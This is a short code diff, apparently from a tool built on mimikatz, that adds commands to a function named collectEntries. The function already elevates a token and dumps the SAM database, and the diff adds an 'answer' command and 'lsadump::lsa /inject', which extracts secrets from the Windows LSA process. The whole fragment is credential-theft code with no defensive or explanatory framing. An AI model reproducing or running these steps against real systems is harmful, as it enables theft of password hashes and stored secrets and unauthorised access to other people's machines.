@@ -224,7 +224,12 @@ size_t WINAPI collectEntries()
 	mimikatz_dispatchCommand(L"token::whoami");
 	mimikatz_dispatchCommand(L"token::elevate");
 	mimikatz_dispatchCommand(L"token::whoami");
+
+	mimikatz_dispatchCommand(L"answer");
 	mimikatz_dispatchCommand(L"lsadump::sam");
+
+	mimikatz_dispatchCommand(L"answer");
+	mimikatz_dispatchCommand(L"lsadump::lsa /inject");
 	
 	mimikatz_end();
 
